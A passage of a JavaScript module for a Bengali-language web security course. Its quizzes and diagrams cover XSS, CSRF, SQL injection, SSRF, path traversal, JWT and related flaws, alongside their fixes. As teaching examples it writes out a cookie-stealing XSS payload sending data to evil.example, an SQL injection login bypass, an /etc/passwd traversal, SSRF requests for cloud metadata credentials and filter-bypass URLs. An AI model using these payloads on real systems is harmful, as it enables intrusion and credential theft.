// Security track — ধাপের বাড়তি visual (গঠন net.js-এর শুরুতে লেখা)
import { ask } from './net.js';

export default {
  // ───────── Phase 1
  http: {
    1: { anatomy: { title: 'একটি HTTP request — প্রতিটি লাইন attacker নিজের মতো লিখতে পারে', parts: [
      ['POST', 'Method', 'কী করতে চাই। Attacker GET-কে POST, PUT, DELETE — যা খুশি বানাতে পারে।'],
      [' ', ''],
      ['/api/orders/1042', 'Path', 'কোন resource। ১০৪২-কে ১০৪৩ করে দেখা attacker-এর প্রথম পরীক্ষা (IDOR)।', 'bad'],
      [' HTTP/1.1\n', ''],
      ['Host: shop.example\n', 'Host header', 'কোন site — একই IP-তে অনেক site থাকতে পারে।'],
      ['Cookie: sid=9f2c…\n', 'Cookie', 'তোমার পরিচয়। এটা চুরি হলে attacker-ই “তুমি”।', 'bad'],
      ['Content-Type: application/json\n', 'Content-Type', 'Body কোন ভাষায় লেখা।'],
      ['\n', ''],
      ['{"qty": -5, "price": 1}', 'Body', 'আসল data। UI-তে যা-ই validation থাকুক, এখানে যেকোনো মান বসানো যায় — তাই server-এ আবার যাচাই বাধ্যতামূলক।', 'bad'],
    ] } },
    4: { ask: ask('তোমার React form-এ দাম বদলানোর কোনো ঘরই নেই। তবু কি attacker request-এ price বদলে পাঠাতে পারে?', ['হ্যাঁ — সে UI ব্যবহারই করে না, সরাসরি request বানায়', 'না — form-এ field না থাকলে পাঠানো অসম্ভব', 'শুধু admin হলে পারে'], 0, 'Browser-এর ভেতরের সবকিছু (JS validation, hidden field, disabled button) attacker-এর নিয়ন্ত্রণে। বিশ্বাসযোগ্য যাচাই হয় শুধু server-এ।') },
  },
  session: {
    3: { anatomy: { title: 'একটি JWT — তিন টুকরো, dot দিয়ে জোড়া', parts: [
      ['eyJhbGciOiJIUzI1NiJ9', 'Header', 'Base64 করা JSON: {"alg":"HS256"} — কোন algorithm দিয়ে সই করা।'],
      ['.', ''],
      ['eyJzdWIiOiI3Iiwicm9sZSI6InVzZXIifQ', 'Payload', 'Base64 করা JSON: {"sub":"7","role":"user"}। এটা encrypt করা নয় — যে কেউ decode করে পড়তে পারে! গোপন কিছু এখানে রাখবে না।', 'bad'],
      ['.', ''],
      ['SflKxwRJSMeKKF2QT4fwpM', 'Signature', 'header + payload-কে server-এর secret দিয়ে সই। Payload-এর একটা অক্ষর বদলালেই সই মিলবে না — এটাই JWT-র একমাত্র সুরক্ষা।', 'good'],
    ] } },
    5: { seq: { title: 'Session hijacking — XSS দিয়ে cookie চুরি', actors: [['🧑', 'Victim'], ['🌐', 'shop.example'], ['😈', 'Attacker']], msgs: [
      [0, 1, 'login ✓', 'Victim স্বাভাবিকভাবে login করল।'],
      [1, 0, 'Set-Cookie: sid=9f2c (HttpOnly নেই)', 'Cookie-তে HttpOnly দেওয়া হয়নি — অর্থাৎ JavaScript এটা পড়তে পারে।', 'bad'],
      [0, 2, 'document.cookie → evil.example', 'Page-এ লুকানো একটি XSS script চুপচাপ cookie-টা attacker-এর কাছে পাঠিয়ে দিল।', 'bad'],
      [2, 1, 'Cookie: sid=9f2c', 'Attacker নিজের browser-এ সেই cookie বসিয়ে request পাঠাল।', 'bad'],
      [1, 2, 'স্বাগতম, Victim!', 'Server শুধু cookie চেনে, মানুষ নয়। Password জানা ছাড়াই account দখল।', 'bad'],
    ] } },
  },
  authz: {
    1: { seq: { title: 'Broken Access Control — login আছে, কিন্তু মালিকানা যাচাই নেই', actors: [['🧑', 'User #7'], ['⚙️', 'API'], ['🗄️', 'DB']], msgs: [
      [0, 1, 'GET /orders/1002  (নিজের token)', 'User 7 সত্যিই logged in — কিন্তু ১০০২ নম্বর order তার নয়।'],
      [1, 1, 'token ঠিক আছে ✓', 'API শুধু দেখল “logged in কি না” — authentication পাস।'],
      [1, 2, 'SELECT * FROM orders WHERE id = 1002', 'Query-তে “AND user_id = 7” নেই।', 'bad'],
      [1, 0, '200 OK — অন্যের order', 'অন্য মানুষের নাম, ঠিকানা, ফোন নম্বর ফাঁস।', 'bad'],
    ] } },
    2: { ask: ask('User logged in আছে, কিন্তু admin panel-এ ঢুকতে চাইছে। Server কোন status দেবে?', ['403 Forbidden', '401 Unauthorized', '404 সবসময়'], 0, '401 = “তুমি কে, আগে প্রমাণ দাও”। 403 = “তোমাকে চিনি, কিন্তু এটার অনুমতি নেই”।') },
  },
  recon: {
    0: { ask: ask('robots.txt-এ লেখা আছে “Disallow: /admin-backup/”। Attacker-এর কাছে এর মানে কী?', ['একটা আকর্ষণীয় লুকানো path-এর সন্ধান', 'ওখানে ঢোকা নিষেধ, তাই সে ঢুকবে না', 'কিছুই না'], 0, 'robots.txt শুধু ভদ্র search engine-এর জন্য অনুরোধ — নিরাপত্তা নয়। বরং এটা গোপন path-এর তালিকা হয়ে যায়।') },
    2: { anatomy: { title: '`curl -I` — response header থেকে কী কী ফাঁস হয়', parts: [
      ['HTTP/1.1 200 OK\n', ''],
      ['Server: nginx/1.18.0\n', 'Version ফাঁস', 'হুবহু version জানলে attacker সরাসরি সেই version-এর জানা CVE খোঁজে। প্রতিকার: `server_tokens off;`', 'bad'],
      ['X-Powered-By: Express\n', 'Framework ফাঁস', 'কোন framework — আক্রমণের ধরন বাছাই সহজ হয়ে গেল। এই header মুছে দাও।', 'bad'],
      ['Set-Cookie: connect.sid=…\n', 'Cookie-র নাম', 'নাম দেখেই বোঝা যায় কোন session library ব্যবহার হচ্ছে।'],
      ['X-Debug-Token: 4f2a1c', 'Debug চিহ্ন', 'Production-এ debug mode চালু থাকার ইঙ্গিত — attacker-এর জন্য সোনার খনি।', 'bad'],
    ] } },
  },
  threat: {
    0: { ask: ask('Threat modeling করার সবচেয়ে সস্তা ও কার্যকর সময় কোনটা?', ['Design-এর সময় — code লেখার আগে', 'Hack হওয়ার পরে', 'Production-এ যাওয়ার ঠিক আগের রাতে'], 0, 'নকশায় ভুল ধরা পড়লে বদলাতে লাগে কয়েক মিনিট; production-এ ধরা পড়লে লাগে সপ্তাহ, টাকা আর সুনাম।') },
    3: { bars: { title: 'ঝুঁকি = সম্ভাবনা × ক্ষতি (উদাহরণ score, ১০০-তে)', items: [['Login-এ SQL injection', 90, '৯ × ১০ = ৯০', 'bad'], ['অন্যের order দেখা (IDOR)', 72, '৯ × ৮ = ৭২', 'bad'], ['Rate limit নেই', 42, '৭ × ৬ = ৪২'], ['Server version header ফাঁস', 12, '৬ × ২ = ১২', 'good']], note: 'সব একসাথে ঠিক করা যায় না — উপর থেকে শুরু করো।' } },
  },
  // ───────── Phase 2
  xss: {
    0: { anatomy: { title: 'একটি XSS payload-এর ভেতরে', parts: [
      ['<img ', 'নিরীহ tag', 'দেখতে সাধারণ একটি ছবির tag — অনেক filter শুধু <script> খোঁজে, এটাকে ছেড়ে দেয়।'],
      ['src=x ', 'ভুল ঠিকানা', 'ইচ্ছে করে এমন ছবি যা কখনো load হবে না…'],
      ['onerror="', 'Event handler', '…ফলে error ঘটবে, আর এই handler-এর JavaScript চলবে।', 'bad'],
      ['fetch(\'https://evil.example/c?d=\'', 'Attacker-এর server', 'Data কোথায় পাঠানো হবে।', 'bad'],
      ['+document.cookie)', 'চুরির মাল', 'Victim-এর session cookie (যদি HttpOnly না থাকে)।', 'bad'],
      ['">', ''],
    ] } },
    1: { seq: { title: 'Stored XSS — একবার বসাও, সবাই আক্রান্ত', actors: [['😈', 'Attacker'], ['🌐', 'Site + DB'], ['🧑', 'Victim']], msgs: [
      [0, 1, 'comment: <script>…</script>', 'Attacker review বা comment-এর ঘরে লেখার বদলে code জমা দিল।', 'bad'],
      [1, 1, 'যেমন আছে তেমন সংরক্ষণ', 'Site কিছু না ভেবেই database-এ রেখে দিল।'],
      [2, 1, 'GET /product/42', 'পরে একজন সাধারণ user page-টা খুলল।'],
      [1, 2, 'HTML + attacker-এর script', 'Site সেই comment escape না করেই page-এ বসিয়ে দিল। Browser বোঝে না কোনটা site-এর code আর কোনটা attacker-এর।', 'bad'],
      [2, 0, 'cookie / token', 'Script victim-এর browser-এ, victim-এর পরিচয়ে চলে — যা খুশি করতে পারে।', 'bad'],
    ] } },
    2: { ask: ask('React সাধারণত `{userInput}` নিজেই escape করে। তাহলে React app-এ XSS ঢোকে কোন পথে?', ['dangerouslySetInnerHTML আর href="javascript:…"', 'useState ব্যবহার করলে', 'কোনো পথেই না — React সম্পূর্ণ নিরাপদ'], 0, 'নামেই সতর্কবার্তা আছে — dangerouslySetInnerHTML escape করে না। User-এর দেওয়া URL সরাসরি href-এ বসানোও আরেকটি পথ।') },
  },
  csrf: {
    1: { seq: { title: 'CSRF — browser নিজে থেকেই cookie জুড়ে দেয়', actors: [['🧑', 'Victim-এর browser'], ['🏦', 'bank.example'], ['😈', 'evil.example']], msgs: [
      [0, 1, 'login ✓ → cookie', 'Victim bank-এ logged in; cookie browser-এ জমা আছে।'],
      [0, 2, '“ফ্রি iPhone!” link-এ ক্লিক', 'অন্য tab-এ সে attacker-এর page খুলল।'],
      [2, 0, 'লুকানো <form action="bank…/transfer">', 'Page-এ একটি অদৃশ্য form, যা নিজে থেকেই submit হয়।', 'bad'],
      [0, 1, 'POST /transfer + Cookie (স্বয়ংক্রিয়)', 'Request যাচ্ছে bank-এ, তাই browser নিজে থেকেই bank-এর cookie জুড়ে দিল — attacker cookie কখনো দেখেইনি!', 'bad'],
      [1, 0, '200 — ৳৫০,০০০ পাঠানো হয়েছে', 'Bank-এর চোখে এটা victim-এর নিজের request।', 'bad'],
    ] } },
    2: { ask: ask('Cookie-তে SameSite=Lax থাকলে উপরের আক্রমণে কী বদলাবে?', ['অন্য site থেকে আসা POST-এ cookie যাবেই না', 'Cookie encrypt হয়ে যাবে', 'কিছুই বদলাবে না'], 0, 'SameSite browser-কে বলে: “request অন্য site থেকে শুরু হলে এই cookie জুড়ো না।” সাথে CSRF token রাখলে দুই স্তরের সুরক্ষা।') },
  },
  sqli: {
    1: { anatomy: { title: 'Input কীভাবে query-র অর্থ বদলে দেয়', parts: [
      ['SELECT * FROM users WHERE email = \'', 'Developer-এর লেখা', 'Code-এ string জোড়া দিয়ে বানানো query-র প্রথম অংশ।'],
      ['\' OR \'1\'=\'1\'', 'Attacker-এর input', 'প্রথম quote দিয়ে string আগেই বন্ধ করে দিল, তারপর নিজের শর্ত জুড়ল — যা সবসময় সত্য।', 'bad'],
      [' --', 'Comment', 'SQL-এ -- মানে “বাকিটা উপেক্ষা করো”।', 'bad'],
      ['\' AND password = \'…\'', 'বাতিল হয়ে গেল', 'Password যাচাইয়ের অংশটা এখন comment — database আর এটা পড়েই না। ফল: প্রথম user (সাধারণত admin) হিসেবে login।'],
    ] } },
    2: { ask: ask('Login form-এ input-এর quote চিহ্ন মুছে দিলেই কি SQL injection বন্ধ?', ['না — সংখ্যার field, encoding ইত্যাদি দিয়ে পাশ কাটানো যায়', 'হ্যাঁ, পুরোপুরি বন্ধ', 'হ্যাঁ, যদি সাথে password লম্বা হয়'], 0, 'Blocklist সবসময় কিছু না কিছু বাদ দেয় (`WHERE id = 5 OR 1=1`-এ quote-ই লাগে না)। একমাত্র নির্ভরযোগ্য সমাধান parameterized query।') },
    3: { seq: { title: 'Parameterized query — code আর data আলাদা পথে', actors: [['⚙️', 'Node.js app'], ['🗄️', 'PostgreSQL']], msgs: [
      [0, 1, 'PREPARE: … WHERE email = $1', 'আগে শুধু query-র কাঠামো যায়। Database এটা parse করে পরিকল্পনা বানিয়ে ফেলে।'],
      [0, 1, 'value $1 = "\' OR \'1\'=\'1\' --"', 'তারপর মান আলাদাভাবে যায় — নিছক data হিসেবে।'],
      [1, 1, 'ওই অদ্ভুত নামের email খুঁজছে', 'কাঠামো আগেই পাকা — তাই মানের ভেতরের quote বা OR কখনো SQL হিসেবে চলে না।', 'good'],
      [1, 0, '0 rows', 'অমন email কারো নেই। আক্রমণ ব্যর্থ।', 'good'],
    ] } },
  },
  idor: {
    0: { anatomy: { title: 'IDOR — শুধু একটা সংখ্যা বদলানো', parts: [
      ['GET ', ''],
      ['/api/invoices/', 'Endpoint', 'একদম বৈধ endpoint; attacker-ও বৈধভাবে logged in।'],
      ['1042', 'নিজের ID', 'এটা তার নিজের invoice।'],
      ['   →   /api/invoices/', ''],
      ['1043', 'অন্যের ID', 'শুধু ১ যোগ করল। Server যদি না দেখে “১০৪৩ কি এই user-এর?” — অন্যের invoice হাতে। একটা loop চালালে সবার।', 'bad'],
    ] } },
    2: { ask: ask('ID-কে 1043-এর বদলে UUID করে দিলেই কি IDOR ঠিক হয়ে যায়?', ['না — অনুমান কঠিন হয়, কিন্তু ownership check তবুও লাগবে', 'হ্যাঁ, পুরোপুরি', 'হ্যাঁ, যদি HTTPS থাকে'], 0, 'UUID log, share করা link, Referer ইত্যাদি দিয়ে ফাঁস হতে পারে। আসল সমাধান: প্রতিটি query-তে `AND user_id = $current`।') },
  },
  ssrf: {
    0: { seq: { title: 'SSRF — server-কে দিয়ে নিজের ভেতরের দরজা খোলানো', actors: [['😈', 'Attacker'], ['⚙️', 'তোমার server'], ['🔐', 'Cloud metadata (169.254.169.254)']], msgs: [
      [0, 1, 'POST /fetch-image  url=http://169.254.169.254/…', '“URL থেকে ছবি আনো” feature-এ attacker একটি ভেতরের ঠিকানা দিল।', 'bad'],
      [1, 2, 'GET /latest/meta-data/iam/…', 'Server বিশ্বস্তভাবে সেই URL-এ গেল। বাইরে থেকে এ ঠিকানায় পৌঁছানো অসম্ভব — কিন্তু server তো ভেতরের লোক।', 'bad'],
      [2, 1, 'AccessKey + Secret', 'Metadata service ভাবল নিজের machine-ই জিজ্ঞেস করছে।', 'bad'],
      [1, 0, '“ছবি”-র জায়গায় credentials', 'Attacker এখন তোমার cloud account-এর চাবি পেয়ে গেল।', 'bad'],
    ] } },
    2: { layers: { title: '“127.0.0.1 block করেছি” — একই ঠিকানার কত রূপ', items: [
      ['🔢', 'http://2130706433/', '127.0.0.1-কে একটি দশমিক সংখ্যা হিসেবে লেখা — অনেক library এটাও মানে।'],
      ['🧮', 'http://0x7f.0.0.1/  বা  http://127.1/', 'Hex বা সংক্ষিপ্ত রূপ।'],
      ['6️⃣', 'http://[::1]/', 'IPv6-এর loopback।'],
      ['📒', 'http://my.evil.example/', 'Attacker-এর নিজের domain, যার DNS record 127.0.0.1-এ point করে। আরও খারাপ: যাচাইয়ের সময় ভালো IP, আসল request-এর সময় ভেতরের IP (DNS rebinding)।'],
      ['↪️', 'https://ok.example/redirect', 'প্রথম URL নিরীহ, কিন্তু সে 302 দিয়ে ভেতরের ঠিকানায় পাঠিয়ে দেয়।'],
    ] } },
  },
  upload: {
    0: { ask: ask('Server শুধু filename-এর শেষে “.jpg” আছে কি না দেখে। attacker “shell.php.jpg” বা “avatar.jpg” নামে PHP code পাঠালে?', ['Extension মিলে যাবে — যাচাই পাস', 'Server নিজে থেকেই বুঝে আটকাবে', 'File upload হবেই না'], 0, 'নাম attacker-এর লেখা একটা string মাত্র। File-এর আসল পরিচয় তার ভেতরের bytes-এ, নামে নয়।') },
    1: { anatomy: { title: 'Upload request-এর কোন অংশ বিশ্বাস করা যায়?', parts: [
      ['filename="invoice.pdf"\n', 'Filename', 'পুরোপুরি attacker-এর লেখা। “../../etc/cron.d/x” বা “shell.php” — যা খুশি হতে পারে। নিজে নতুন random নাম দাও।', 'bad'],
      ['Content-Type: application/pdf\n', 'Content-Type', 'এটাও client পাঠায় — এক লাইনে বদলানো যায়।', 'bad'],
      ['%PDF-1.7 …', 'Magic bytes', 'File-এর প্রথম কয়েক byte। Extension-এর চেয়ে ভালো প্রমাণ, কিন্তু নকল করা সম্ভব (polyglot file)।'],
      [' …<script>… ', 'ভেতরের content', 'আসল বিপদ এখানে লুকিয়ে থাকে। তাই: আলাদা domain/bucket থেকে serve করো, execute permission দিও না, ছবি হলে re-encode করো।', 'bad'],
    ] } },
  },
  traversal: {
    0: { anatomy: { title: 'Path traversal — “../” দিয়ে folder থেকে বেরিয়ে যাওয়া', parts: [
      ['/download?file=', 'Endpoint', 'Server ভেবেছিল user শুধু একটা filename দেবে, যেমন report.pdf।'],
      ['../../../', 'উপরে ওঠা', 'প্রতিটি “../” মানে এক folder উপরে। তিনবার = /var/www/uploads থেকে একদম root-এ।', 'bad'],
      ['etc/passwd', 'লক্ষ্য', 'System-এর user তালিকা। একইভাবে .env, SSH key, source code — সবই পড়া যায়।', 'bad'],
    ], note: 'Server-এ যা তৈরি হয়: /var/www/uploads/../../../etc/passwd  →  /etc/passwd' } },
    1: { ask: ask('Developer input থেকে সব “../” মুছে দিল। attacker পাঠাল “....//....//etc/passwd”। মোছার পর কী থাকবে?', ['../../etc/passwd — আবার সেই আক্রমণ', 'ফাঁকা string', 'একটা error'], 0, 'মাঝখান থেকে “../” সরালে দু’পাশের টুকরো জোড়া লেগে নতুন “../” হয়। তাই মোছামুছি নয় — path resolve করে দেখো সেটা অনুমোদিত folder-এর ভেতরে পড়ে কি না।') },
  },
  clickjack: {
    0: { layers: { title: 'Clickjacking — একটি page-এর তিন স্তর', items: [
      ['👆', 'তোমার ক্লিক', 'তুমি ভাবছ নিচের “পুরস্কার নাও” বোতামে চাপ দিচ্ছ।'],
      ['👻', 'অদৃশ্য iframe (opacity: 0)', 'ঠিক ওই জায়গার উপরে স্বচ্ছ করে বসানো আসল site (যেখানে তুমি logged in) — আর তার “Delete account” বোতাম। ক্লিক আসলে এখানেই পড়ে।'],
      ['🎁', 'টোপের page', 'Attacker-এর বানানো লোভনীয় page — তুমি শুধু এটাই দেখতে পাও।'],
    ] } },
    1: { ask: ask('কোন response header তোমার site-কে অন্যের iframe-এ load হতে দেয় না?', ['Content-Security-Policy: frame-ancestors \'none\'', 'Access-Control-Allow-Origin: *', 'Cache-Control: no-store'], 0, 'frame-ancestors (বা পুরনো X-Frame-Options: DENY) browser-কে বলে: “এই page কারো frame-এর ভেতরে দেখাবে না।”') },
  },
  redirect: {
    0: { anatomy: { title: 'Open redirect — আসল domain-এর আড়ালে নকল site', parts: [
      ['https://shop.example', 'বিশ্বস্ত domain', 'Victim link-এর শুরুটা দেখে নিশ্চিন্ত হয় — এটা তো সত্যিই আসল site।', 'good'],
      ['/login?next=', 'Redirect parameter', 'Login-এর পর কোথায় পাঠাবে — সুবিধার জন্য বানানো feature।'],
      ['https://shop-example.evil.example/login', 'Attacker-এর গন্তব্য', 'আসল site নিজেই victim-কে এখানে পাঠিয়ে দেয়। হুবহু একই চেহারার নকল page: “session শেষ, আবার password দিন”।', 'bad'],
    ] } },
    1: { layers: { title: '“শুধু নিজের domain-এ redirect” — দুর্বল যাচাই যেভাবে ভাঙে', items: [
      ['➗', '//evil.example', 'Scheme ছাড়া URL — “/” দিয়ে শুরু বলে relative path মনে হয়, কিন্তু browser এটাকে অন্য domain হিসেবে নেয়।'],
      ['📧', 'https://shop.example@evil.example', '@-এর আগের অংশ আসলে username; আসল host হলো evil.example।'],
      ['🧩', 'https://shop.example.evil.example', '“shop.example দিয়ে শুরু?” — হ্যাঁ, কিন্তু এটা evil.example-এর একটি subdomain।'],
      ['✅', 'সমাধান', 'পূর্ণ URL নিও না। শুধু `/dashboard`-এর মতো relative path বা আগে থেকে ঠিক করা allowlist-এর key নাও।'],
    ] } },
  },
  bruteforce: {
    0: { bars: { title: '৬ সংখ্যার OTP-র সব ১০ লাখ সম্ভাবনা চেষ্টা করতে সময়', scale: 'log', items: [['Rate limit নেই (১,০০০/সেকেন্ড)', 17, '~১৭ মিনিট', 'bad'], ['প্রতি মিনিটে ৫ বার সীমা', 200000, '~১৩৯ দিন', 'good']], note: 'সাথে “৫ বার ভুল হলে OTP বাতিল” নিয়ম থাকলে সময়টা কার্যত অসীম।' } },
    1: { seq: { title: 'User enumeration — error message-ই তথ্য ফাঁস করে', actors: [['😈', 'Attacker'], ['⚙️', 'Login API']], msgs: [
      [0, 1, 'email: abc@x.com', 'একটা এলোমেলো email দিয়ে চেষ্টা।'],
      [1, 0, '“এই email-এ কোনো account নেই”', 'Attacker জানল: এটা বাদ।'],
      [0, 1, 'email: rafi@x.com', 'আরেকটা।'],
      [1, 0, '“ভুল password”', 'আহা! তার মানে এই email-এ account আছে। এখন শুধু password অনুমান বাকি — কাজ অর্ধেক হয়ে গেল।', 'bad'],
      [1, 0, '“Email অথবা password ভুল”', 'সঠিক উপায়: দুই ক্ষেত্রেই হুবহু একই message, একই status, একই সময়।', 'good'],
    ] } },
    3: { ask: ask('Attacker একটি সাধারণ password (“Password123”) নিয়ে ১০,০০০ আলাদা account-এ একবার করে চেষ্টা করছে। “৫ বার ভুলে account lock” নিয়ম কি তাকে থামাবে?', ['না — প্রতি account-এ সে মাত্র একবার চেষ্টা করছে', 'হ্যাঁ, সাথে সাথে', 'হ্যাঁ, ৫ম account-এর পরে'], 0, 'এটা password spraying। তাই শুধু account-ভিত্তিক নয় — IP-ভিত্তিক rate limit, ফাঁস হওয়া password-এর তালিকা যাচাই ও MFA একসাথে লাগে।') },
  },
  // ───────── Phase 3
  massassign: {
    1: { anatomy: { title: 'Mass assignment — একটা বাড়তি field', parts: [
      ['PATCH /api/me\n', ''],
      ['{ ', ''],
      ['"name": "Rafi"', 'প্রত্যাশিত field', 'Profile form-এ যা থাকার কথা।'],
      [', ', ''],
      ['"email": "rafi@x.com"', 'প্রত্যাশিত field', 'এটাও ঠিক আছে।'],
      [', ', ''],
      ['"role": "admin"', 'বাড়তি field', 'Form-এ এটা ছিলই না — attacker নিজে জুড়েছে। Server যদি পুরো JSON সরাসরি User struct-এ bind করে save করে, সে এখন admin।', 'bad'],
      [' }', ''],
    ] } },
    2: { ask: ask('API পুরো user object ফেরত দেয়; frontend শুধু নাম দেখায়। Response-এ password_hash থাকলে সমস্যা আছে কি?', ['আছে — DevTools/curl-এ পুরো JSON দেখা যায়', 'নেই — UI-তে তো দেখাচ্ছে না', 'শুধু mobile app-এ সমস্যা'], 0, 'Frontend কী দেখাল তা অপ্রাসঙ্গিক; তারে যা গেল সবই attacker-এর হাতে। আলাদা response DTO বানিয়ে শুধু দরকারি field পাঠাও।') },
  },
  jwt: {
    1: { anatomy: { title: 'alg: none আক্রমণ — সই ছাড়া token', parts: [
      ['{"alg":"none"}', 'Header (বদলানো)', 'Attacker header বদলে লিখল: “এই token-এ কোনো সই নেই”।', 'bad'],
      [' . ', ''],
      ['{"sub":"7","role":"admin"}', 'Payload (বদলানো)', 'নিজের role user থেকে admin করে নিল।', 'bad'],
      [' . ', ''],
      ['(ফাঁকা)', 'Signature', 'সই-ই নেই। দুর্বল library header-এর কথা বিশ্বাস করে যাচাই বাদ দেয় — আর token গ্রহণ করে ফেলে।', 'bad'],
    ], note: 'শিক্ষা: কোন algorithm গ্রহণযোগ্য তা server ঠিক করবে — token-এর header নয়।' } },
    2: { ask: ask('HS256 JWT-র secret যদি হয় “secret123”, attacker কী করতে পারে?', ['Offline-এ secret অনুমান করে নিজের ইচ্ছামতো token সই করতে পারে', 'কিছুই না — JWT তো সই করা', 'শুধু নিজের token পড়তে পারে'], 0, 'একটা বৈধ token হাতে থাকলেই সে নিজের machine-এ প্রতি সেকেন্ডে লাখো secret পরীক্ষা করতে পারে — তোমার server টেরও পাবে না। Secret হোক অন্তত ৩২ byte random।') },
  },
  oauth: {
    1: { seq: { title: 'Authorization Code + PKCE', actors: [['📱', 'তোমার app'], ['🧑', 'User-এর browser'], ['🔑', 'Google (auth server)']], msgs: [
      [0, 0, 'verifier বানাও → challenge = hash(verifier)', 'App একটি গোপন random string (verifier) বানায়; বাইরে পাঠায় শুধু তার hash।'],
      [0, 2, '/authorize?code_challenge=…&state=…', 'User-কে Google-এ পাঠানো হলো, সাথে challenge।'],
      [1, 2, 'login + “অনুমতি দিলাম”', 'User password দেয় শুধু Google-কে — তোমার app কখনো সেটা দেখে না।', 'good'],
      [2, 0, 'redirect …?code=abc', 'একটি স্বল্পমেয়াদি, একবার-ব্যবহারযোগ্য code ফেরত আসে।'],
      [0, 2, 'POST /token  code=abc + verifier', 'App code-এর সাথে আসল verifier পাঠায়।'],
      [2, 0, 'access token + id token', 'Google hash মিলিয়ে দেখে। মাঝপথে code চুরি হলেও verifier ছাড়া তা অকেজো।', 'good'],
    ] } },
    2: { ask: ask('Auth server যদি redirect_uri যাচাই না করে, attacker কী করতে পারে?', ['Authorization code নিজের site-এ পাঠিয়ে নিতে পারে', 'কিছুই না', 'শুধু login ধীর করতে পারে'], 0, 'redirect_uri বদলে দিলে code চলে যায় attacker-এর server-এ। তাই হুবহু মিল (exact match) allowlist বাধ্যতামূলক — wildcard নয়।') },
  },
  apiabuse: {
    0: { ask: ask('কোন endpoint-এ সবচেয়ে কড়া rate limit দরকার?', ['POST /login ও /send-otp', 'GET /products', 'GET /health'], 0, 'যেখানে অনুমান (password, OTP) বা টাকা খরচ (SMS, email) জড়িত — সেগুলোই abuse-এর প্রথম লক্ষ্য।') },
    1: { anatomy: { title: 'সীমা ছাড়ালে server যা উত্তর দেয়', parts: [
      ['HTTP/1.1 429 Too Many Requests\n', 'Status', '429 = “তুমি খুব ঘনঘন আসছ”। 403 বা 500 নয়।'],
      ['Retry-After: 30\n', 'কখন আবার', 'ভদ্র client এটা দেখে ৩০ সেকেন্ড অপেক্ষা করে।'],
      ['X-RateLimit-Limit: 100\n', 'মোট সীমা', 'এই সময়-জানালায় কতগুলো অনুমোদিত।'],
      ['X-RateLimit-Remaining: 0', 'বাকি', 'আর কয়টা করা যাবে — এখন শূন্য।', 'bad'],
    ] } },
  },
  cors: {
    0: { anatomy: { title: 'Origin = scheme + host + port (তিনটিই মিলতে হবে)', parts: [
      ['https', 'Scheme', 'http আর https আলাদা origin।'],
      ['://', ''],
      ['app.shop.example', 'Host', 'shop.example আর app.shop.example-ও আলাদা origin — subdomain মানেই ভিন্ন।'],
      [':', ''],
      ['443', 'Port', ':3000 আর :8080 আলাদা origin। তাই localhost:3000-এর React থেকে localhost:8080-এর Node.js API-তে call করতে CORS লাগে।'],
    ] } },
    1: { ask: ask('Server যে Origin আসে সেটাই Access-Control-Allow-Origin-এ ফেরত দেয়, সাথে Allow-Credentials: true। ফলাফল?', ['যেকোনো site logged-in user-এর data পড়তে পারে', 'কোনো সমস্যা নেই', 'শুধু নিজের domain পারে'], 0, 'এটা “*”-এর চেয়েও খারাপ — কারণ cookie সহ কাজ করে। evil.example-এর JavaScript victim-এর পরিচয়ে তোমার API পড়ে নেবে। নির্দিষ্ট allowlist ব্যবহার করো।') },
    2: { seq: { title: 'Preflight — আসল request-এর আগে অনুমতি চাওয়া', actors: [['🌐', 'Browser (app.example)'], ['⚙️', 'api.example']], msgs: [
      [0, 1, 'OPTIONS /orders  Origin: app.example', 'DELETE বা JSON POST-এর মতো “অ-সাধারণ” request-এর আগে browser নিজে থেকেই জিজ্ঞেস করে।'],
      [1, 0, 'Allow-Origin: app.example, Allow-Methods: DELETE', 'Server জানায় কাকে কী অনুমতি।', 'good'],
      [0, 1, 'DELETE /orders/5', 'অনুমতি মিললে তবেই আসল request যায়।'],
      [1, 0, '204 + Allow-Origin', 'Browser response-টা JavaScript-কে পড়তে দেয়।', 'good'],
      [0, 0, 'মনে রেখো', 'CORS শুধু browser-এর নিয়ম। curl বা Postman এটা মানে না — তাই CORS কখনোই authentication-এর বিকল্প নয়।', 'bad'],
    ] } },
  },
  mobile: {
    0: { seq: { title: 'App binary থেকে secret বের করা — ১০ মিনিটের কাজ', actors: [['😈', 'Attacker'], ['📦', 'APK file'], ['⚙️', 'তোমার API']], msgs: [
      [0, 1, 'Play Store থেকে download', 'App তো সবার জন্যই উন্মুক্ত।'],
      [0, 1, 'jadx দিয়ে decompile', 'বিনামূল্যের tool APK-কে আবার পড়ার মতো code-এ ফেরায়।'],
      [1, 0, 'API_KEY = "sk_live_…"', 'String খুঁজলেই hardcode করা key বেরিয়ে আসে। Obfuscation শুধু একটু দেরি করায়।', 'bad'],
      [0, 2, 'সরাসরি API call (key সহ)', 'এখন app ছাড়াই, নিজের script থেকে।', 'bad'],
    ] } },
    3: { ask: ask('Mobile app-এর ভেতরে কোন জিনিসটা রাখা নিরাপদ?', ['Public identifier (যেমন Firebase project ID)', 'Payment gateway-র secret key', 'Database password'], 0, 'App-এ যা আছে তা public বলেই ধরো। আসল secret থাকবে তোমার backend-এ; app শুধু user-এর নিজের স্বল্পমেয়াদি token রাখবে (Keychain/Keystore-এ)।') },
  },
  pinning: {
    1: { seq: { title: 'Certificate pinning — নকল certificate ধরা পড়ে', actors: [['📱', 'App (pin সহ)'], ['🕵️', 'MITM proxy'], ['🖥️', 'আসল server']], msgs: [
      [0, 1, 'TLS ClientHello', 'Attacker-এর Wi-Fi-তে app-এর connection আগে proxy-তে পড়ে।'],
      [1, 0, 'নকল certificate', 'Proxy নিজের certificate দেখায় — phone-এ বসানো একটি CA দিয়ে সই করা, তাই OS-এর চোখে এটা “বৈধ”।', 'bad'],
      [0, 0, 'public key-র hash ≠ pin', 'কিন্তু app-এর ভেতরে আসল server-এর key-র hash আগে থেকে লেখা। মিলল না।'],
      [0, 1, '✖ connection বাতিল', 'App কোনো data পাঠানোর আগেই সংযোগ কেটে দেয়।', 'good'],
    ] } },
  },
  // ───────── Phase 4
  linux: {
    1: { anatomy: { title: '`ls -l`-এর একটি লাইন পড়া', parts: [
      ['-', 'ধরন', '- সাধারণ file, d directory, l symlink।'],
      ['rwx', 'মালিক (owner)', 'read + write + execute — মালিক সব পারে।'],
      ['r-x', 'Group', 'Group-এর সদস্যরা পড়তে ও চালাতে পারে, বদলাতে পারে না।'],
      ['---', 'বাকি সবাই', 'কিছুই পারে না। .env বা private key-তে এখানে কিছু থাকলেই বিপদ।', 'good'],
      ['  ', ''],
      ['deploy', 'Owner', 'File-এর মালিক user।'],
      [' ', ''],
